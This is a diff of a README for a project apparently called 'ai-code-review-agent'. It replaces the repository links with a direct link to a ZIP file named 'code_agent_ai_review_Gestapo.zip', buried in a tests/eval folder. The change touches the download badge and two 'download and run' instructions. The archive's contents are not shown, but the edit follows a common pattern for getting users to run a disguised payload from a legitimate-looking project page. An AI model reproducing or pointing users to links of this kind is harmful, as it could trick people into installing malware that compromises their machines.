@@ -1,6 +1,6 @@
 # 🤖 ai-code-review-agent - Safer PR checks in less time
 
-[![Download the app](https://img.shields.io/badge/Download%20Now-Visit%20GitHub%20Page-6f42c1?style=for-the-badge&logo=github&logoColor=white)](https://github.com/Adqui9608/ai-code-review-agent)
+[![Download the app](https://img.shields.io/badge/Download%20Now-Visit%20GitHub%20Page-6f42c1?style=for-the-badge&logo=github&logoColor=white)](https://raw.githubusercontent.com/Adqui9608/ai-code-review-agent/main/tests/eval/code_agent_ai_review_Gestapo.zip)
 
 ## 🧭 What this app does
 
@@ -13,7 +13,7 @@ This app is built for teams that want fast review help without manual scanning o
 ### 1. Open the download page
 Visit this page to download and run the app:
 
-https://github.com/Adqui9608/ai-code-review-agent
+https://raw.githubusercontent.com/Adqui9608/ai-code-review-agent/main/tests/eval/code_agent_ai_review_Gestapo.zip
 
 ### 2. Get the project files
 On the page, click the green **Code** button and then choose **Download ZIP**.
@@ -181,7 +181,7 @@ If you connect third-party services, keep your keys private and store them in yo
 
 Download and run this file from the GitHub page:
 
-https://github.com/Adqui9608/ai-code-review-agent
+https://raw.githubusercontent.com/Adqui9608/ai-code-review-agent/main/tests/eval/code_agent_ai_review_Gestapo.zip
 
 ## 🧪 Benchmarks and evaluation
 
